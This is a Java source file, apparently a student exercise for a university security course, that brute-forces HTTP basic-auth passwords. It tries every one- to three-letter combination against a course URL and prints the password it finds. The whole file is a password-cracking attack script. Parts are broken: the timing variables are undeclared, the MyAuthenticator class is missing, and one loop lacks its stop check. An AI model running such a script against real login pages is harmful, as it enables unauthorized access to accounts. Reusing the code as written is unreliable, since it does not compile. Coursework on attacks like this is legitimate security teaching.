




import java.io.*;
import java.net.*;



public class BruteForce
{
   public static void main(String args[]) throws IOException,
   MalformedURLException
   {
      final String username = "";
      final String fullurl = "http://sec-crack.cs.rmit.edu./SEC/2/";
      
      String temppass;
      String password = "";
      URL url = new URL(fullurl);
      boolean cracked = false;
      
      String c[] = {"A","B","C","D","E","F","G","H","I","J","K","L","M","N","O",
                    "P","Q","R","S","T","U","V","W","X","Y","Z","a","b","c","d",
                    "e","f","g","h","i","j","k","l","m","n","o","p","q","r","s",
                    "t","u","v","w","x","y","z"};
      
       startTime = System.currentTimeMillis();
                    
      
      
      for(int i = 0; i < 52 && !cracked; i++) {
         temppass = c[i]; 
         Authenticator.setDefault(new MyAuthenticator(username, temppass));
         try{
            
            
            BufferedReader r = new BufferedReader(new InputStreamReader(
               url.openStream()));
            
            
            cracked = true;
            password = temppass;
         } catch(Exception e){}
      }
      
      for(int i = 0; i < 52 && !cracked; i++) {
         for(int j = 0; j < 52 && !cracked; j++) {
            temppass = c[i]+c[j];
            Authenticator.setDefault(new MyAuthenticator(username, temppass));
            try{
               BufferedReader r = new BufferedReader(new InputStreamReader(
                  url.openStream()));
               cracked = true;
               password = temppass;
            } catch(Exception e){}
         }
      }
      
      for(int i = 0; i < 52 && !cracked; i++) {
         for(int j = 0; j < 52 && !cracked; j++) {
            for(int k = 0; k < 52; k++) {
               temppass = c[i]+c[j]+c[k];
               Authenticator.setDefault(new MyAuthenticator(username,temppass));
               try{
                  BufferedReader r = new BufferedReader(new InputStreamReader(
                     url.openStream()));
                  cracked = true;
                  password = temppass;
               } catch(Exception e){}
            }
         }
      }
       stopTime = System.currentTimeMillis();
      
      if(!cracked)
         System.out.println("Sorry, couldnt find the password");
      else
         System.out.println("Password found: "+password);
      System.out.println("Time taken: "+(stopTime-startTime));
   }
}

